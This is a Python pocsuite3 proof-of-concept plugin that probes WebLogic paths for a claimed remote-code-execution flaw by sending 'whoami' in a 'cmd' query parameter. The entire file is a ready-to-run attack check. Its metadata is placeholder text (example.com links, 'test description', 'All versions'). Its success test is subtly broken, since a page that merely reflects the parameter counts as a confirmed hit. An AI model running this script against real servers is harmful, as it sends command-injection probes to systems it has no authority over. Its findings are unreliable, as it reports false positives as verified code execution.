from pocsuite3.api import Output, POCBase, register_poc, requests, logger


class WebLogicCmdRCE(POCBase):
    vulID = '1'
    version = '1.0'
    author = 'Senior Security Researcher'
    vulDate = '2023-10-27'
    createDate = '2023-10-27'
    updateDate = '2023-10-27'
    references = ['https://example.com']
    name = 'WebLogic RCE via cmd parameter'
    appPowerLink = 'https://example.com'
    appName = 'WebLogic'
    appVersion = 'All versions'
    vulType = 'Remote Code Execution'
    desc = 'This is a test description for weblogic. The target is vulnerable to RCE via parameter cmd.'
    samples = []
    install_requires = []

    def _verify(self):
        result = Output(self)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Common paths for WebLogic management interfaces
        target_paths = ['', '/console', '/uddiexplorer']
        
        # Command to check (whoami is safe and works on both Linux and Windows)
        cmd_payload = 'whoami'

        for path in target_paths:
            url = self.url.rstrip('/')
            if path:
                url = url + path
            
            # Construct the URL with the vulnerable parameter
            verify_url = f"{url}?cmd={cmd_payload}"

            try:
                resp = requests.get(verify_url, timeout=5, headers=headers, verify=False, allow_redirects=False)
                
                # Check for vulnerability indicators
                # In a real scenario, specific headers or response bodies would be checked.
                # Here we check if the command output is present in the response.
                if resp.status_code == 200 and 'whoami' in resp.text.lower():
                    result.success = True
                    result.output = {
                        'url': verify_url,
                        'status_code': resp.status_code,
                        'response': resp.text
                    }
                    return result
                
                # Fallback: check for common command output formats (uid, gid, users)
                if 'uid=' in resp.text or 'gid=' in resp.text:
                    result.success = True
                    result.output = {
                        'url': verify_url,
                        'status_code': resp.status_code,
                        'response': resp.text
                    }
                    return result

            except requests.exceptions.Timeout:
                logger.debug(f"Request timed out for {verify_url}")
            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {verify_url}: {e}")
            except Exception as e:
                logger.error(f"Unexpected error for {verify_url}: {e}")

        return result

    def _attack(self):
        # For RCE, verify is often sufficient, but we define _attack explicitly
        return self._verify()

    def parse_output(self, result):
        if result.success:
            self.output.report(result, 'high')
